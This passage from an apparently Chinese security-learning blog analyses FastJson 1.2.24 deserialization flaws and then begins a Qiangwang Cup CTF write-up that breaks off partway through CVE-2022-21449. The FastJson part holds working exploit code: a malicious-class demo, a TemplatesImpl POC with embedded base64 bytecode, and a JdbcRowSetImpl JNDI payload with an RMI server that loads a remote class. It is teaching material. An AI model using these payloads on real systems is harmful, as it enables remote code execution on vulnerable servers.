<li>无参数</li>
<li>第四个字符是大写的</li>
</ul>
<h3 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h3><h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><blockquote>
<p>由于version 1.2.24默认开启autoType，使得攻击者可以控制@type后面的类，而fastjson会根据json字符串中的@type自动选择反序列化的类，并自动调用类中的get和set方法，如果这些方法存在漏洞，就可以恶意利用了</p>
</blockquote>
<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><p>就比如我们创建一个恶意类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FJDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将他序列化（当然序列化的时候发现也会调用啦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;FastJson.FJDemo&quot;,&quot;name&quot;:&quot;calc&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.FJDemo\&quot;,\&quot;name\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b6124978153544859fc38a40250e6d9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h5><p>POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line"> <span class="string">&quot;_bytecodes&quot;</span>: [</span><br><span class="line"><span class="string">&quot;……&quot;</span> <span class="comment">// base64加密的字节码</span></span><br><span class="line"> ],</span><br><span class="line"> <span class="string">&quot;_name&quot;</span>: <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line"> <span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line"> <span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.这里不要忘了前面讲到TemplatesImpl动态加载字节码的时候，类要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>2.这里把exec放在set方法中没有执行成功</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FJDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FJDemo fjDemo = <span class="keyword">new</span> FJDemo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<blockquote>
<p>TemplatesImpl Gadget重点在于<code>_bytecodes</code>和<code>_outputProperties</code>，而TemplatesImpl中也存在大量private的属性没有setter或者getter，所以要设置Feature.SupportNonPublicField=true</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_bytecodes\&quot;: [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;yv66vgAAADQALgoACAAeCgAfACAIACEKAB8AIgkABgAjBwAkCgAGAB4HACUBAARuYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACYBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAHc2V0TmFtZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwcAKAEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKU291cmNlRmlsZQEAC0ZKRGVtby5qYXZhDAALAAwHACkMACoAKwEABGNhbGMMACwALQwACQAKAQAPRmFzdEpzb24vRkpEZW1vAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYACAAAAAEAAgAJAAoAAAAGAAEACwAMAAIADQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAOAAAADgADAAAADgAEAA8ADQAQAA8AAAAEAAEAEAABABEAEgACAA0AAAAZAAAAAwAAAAGxAAAAAQAOAAAABgABAAAAFQAPAAAABAABABMAAQARABQAAgANAAAAGQAAAAQAAAABsQAAAAEADgAAAAYAAQAAABoADwAAAAQAAQATAAEAFQAWAAEADQAAACIAAgACAAAABiortQAFsQAAAAEADgAAAAoAAgAAAB0ABQAeAAEAFwAYAAIADQAAAB0AAQABAAAABSq0AAWwAAAAAQAOAAAABgABAAAAIQAPAAAABAABABkACQAaABsAAgANAAAAJQACAAIAAAAJuwAGWbcAB0yxAAAAAQAOAAAACgACAAAAJQAIACYADwAAAAQAAQAQAAEAHAAAAAIAHQ==\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; ],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_name\&quot;: \&quot;aaa\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">        JSON.parse(str,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="浅析："><a href="#浅析：" class="headerlink" title="浅析："></a>浅析：</h6><blockquote>
<p>前面一大段和前面分析反序列化源码的时候一样，重复的就不解析了</p>
</blockquote>
<p>在<code>JavaBeanDeserializer#deserialize</code>中在解析属性的时候跟进到<code>JavaBeanDeserializer#parseField</code>和<code>JavaBeanDeserializer#smartMatch</code></p>
<p>之后在<code>DefaultFieldDeserializer#parseField</code>中对<code>_bytecodes</code>进行base64解密</p>
<p><img src="https://img-blog.csdnimg.cn/597a84db5f024e6db460b1fec5357385.png" alt="img"></p>
<p>当key为<code>_outputPropertie</code>时，因为变量名和数组中的名字不匹配，使得获取这个Filed的deserializer的时候会返回null</p>
<p><img src="https://img-blog.csdnimg.cn/a3e530b24dbc4fb59bdc8e1f271f59bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>在后面对属性名进行判断将<code>_|-</code>删掉，因为在获取属性名的时候，一开始也是从<code>get|set</code>后面截取，再此进去<code>getFieldDeserializer</code>，如果匹配到就返回该<code>FieldDeserializer    </code></p>
<p><img src="https://img-blog.csdnimg.cn/1bc1d4a3118247f887c3ac2abd70cb55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/3b627566363b4c5a83d9b906ec36afc1.png" alt="img"></p>
<p>之后在<code>setValue</code>中调用<code>TemplatesImpl#getOutputProperties</code></p>
<p><img src="https://img-blog.csdnimg.cn/78082511972746c297a9caca0f7eff10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<blockquote>
<p>之后就是之前在CC3 分析过的TemplatesImpl的链子 已知TemplatesImpl存在defineClass处理字节码 </p>
</blockquote>
<p>跟进到<code>TemplatesImpl#newTransformer</code>，在实例化<code>TransformerImpl</code>的时候调用到了<code>getTransletInstance</code>，然后在<code>defineTransletClasses</code>中调用了definClass来处理我们传进去的恶意类的字节码</p>
<p>实现恶意类的实例化</p>
<p><img src="https://img-blog.csdnimg.cn/c8db74e3c69849cea7fa72ac4605f641.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/e9ace8537345494fad16aae0cefea438.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="JNDI-JdbcRowSetImpl"><a href="#JNDI-JdbcRowSetImpl" class="headerlink" title="JNDI JdbcRowSetImpl"></a>JNDI JdbcRowSetImpl</h5><p>因为反序列化的时候会直接去调用类的get、set或者默认的构造方法，那么我们可以先简单地看一下这些方法</p>
<h6 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImpl</span> <span class="keyword">extends</span> <span class="title">BaseRowSet</span> <span class="keyword">implements</span> <span class="title">JdbcRowSet</span>, <span class="title">Joinable</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>默认的构造方法，大部分是set方法，实现变量的初始化，然后set和get也没有什么带有漏洞的，那么我们可以去看一下别的方法，就比如根据对JNDI的了解，实现JNDI注入客户端要能调用到lookup，然后我们传入带有恶意类的RMI URL或者LDAP URL就好了，那么就直接全局搜索<code>lookup</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JdbcRowSetImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.resBundle = JdbcRowSetResourceBundle.getJdbcRowSetResourceBundle();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(var10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.initParams();</span><br><span class="line"></span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.iMatchColumns = <span class="keyword">new</span> Vector(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> var1;</span><br><span class="line">    <span class="keyword">for</span>(var1 = <span class="number">0</span>; var1 &lt; <span class="number">10</span>; ++var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.iMatchColumns.add(var1, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.strMatchColumns = <span class="keyword">new</span> Vector(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(var1 = <span class="number">0</span>; var1 &lt; <span class="number">10</span>; ++var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.strMatchColumns.add(var1, (Object)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以在<code>connect</code>那里发现<code>lookup</code>，然后传入的是<code>dataSource</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而再全局搜索一下<code>connect</code>，发现<code>getDatabaseMetaData</code>和<code>setAutoCommit</code>方法会自动调用<code>this.connect()</code>，不过这该怎么用就要看用<code>parse</code>还是<code>parseObject</code>进行反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/f355965f53514689a31278339992fc69.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/9ad8685baec44733ab56d2a2e03c93fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h6 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h6><p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">&quot;dataSourceName&quot;:&quot;rmi://ip:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><code>Exploit</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	 <span class="keyword">try</span> &#123;</span><br><span class="line"> 		Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"> 	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"> 		e.printStackTrace();</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> 		Exploit exploit = <span class="keyword">new</span> Exploit();</span><br><span class="line"> 	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">		Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为什么用vps和marshalsec会报错，但是jdk版本也是8u112，所以最后在本地自己开JNDI服务，然后用phpstudy开一个端口8000，然后运行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 提供服务 注册 将对象与对应的Name进行绑定</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.RegistryContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>FaIth4444师傅</p>
<p><a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q">https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q</a></p>
<p><a href="https://blog.csdn.net/weixin_44687621/article/details/119947891">https://blog.csdn.net/weixin_44687621/article/details/119947891</a></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯部分WP</title>
    <url>/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/</url>
    <content><![CDATA[<h1 id="TeamGipsy战队-WRITEUP"><a href="#TeamGipsy战队-WRITEUP" class="headerlink" title="TeamGipsy战队 WRITEUP"></a>TeamGipsy战队 WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称：TeamGipsy</p>
<p>战队排名：68</p>
<h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p><img src="https://img-blog.csdnimg.cn/3c6fa2a5d5d14e8680253778754a0ec5.png" alt="image-20220801133145873"></p>
<h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;we1come_t0_qwb_s6&#125;</span><br></pre></td></tr></table></figure>

<h4 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h4><p>填写问卷得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/e8db31248b1c40168688d442ae360a17.jpeg"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="myJWT"><a href="#myJWT" class="headerlink" title="myJWT"></a>myJWT</h4><ul>
<li><p>考点：<a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a></p>
</li>
<li><p>运行环境</p>
<p>java11，下载fastjson的jar包，2.0以上的都报错了，所以选了<a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.9/">fastjson-1.2.9</a></p>
</li>
</ul>
<p>使用的是ECDSA，虽然是密码题，但并不是对ECDSA的签名、验证等步骤操作，这些都由java封装好了</p>
<p>所以是java的问题</p>
<p>由于代码中使用的格式是<code>SHA384withECDSAinP1363Format</code>，经过搜索是<a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a>，发现竟然是java没有判断$(r,s)$是否等于0。。。</p>
<p><img src="https://img-blog.csdnimg.cn/05611fb01eff4132b87cd27e592bc556.png" alt="image-20220731114449362"></p>
<p>此外这些都是不安全的</p>
<p><img src="https://img-blog.csdnimg.cn/6b983c541c0643a6b4d8069610f2d61f.png" alt="image-20220731114725609"></p>
<ul>
<li><p><a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a></p>
<p>java没有判断$(r,s)$是否等于0会如何呢？其实在签名的时候一般都会确保$(r,s)$不为0的，但在验签的时候忽略了</p>
<p><img src="https://img-blog.csdnimg.cn/9e8bc038ab5d4ed4bd1a802e154834d8.png" alt="image-20220731120318947"></p>
<p>验签时计算<br>$$<br>r=x_P\notag<br>$$<br>而$P\equiv u_1G+u_2D\equiv s^{-1}zG+s^{-1}rD\equiv s^{-1}G(z+rd)\ (mod\ n)$</p>
<p>当然0的逆元是不存在的，但是看看java这里是怎么求逆元的</p>
<p><img src="https://img-blog.csdnimg.cn/41e002352e654d0fbec908cfbfbf9cb8.png" alt="image-20220731115417980"></p>
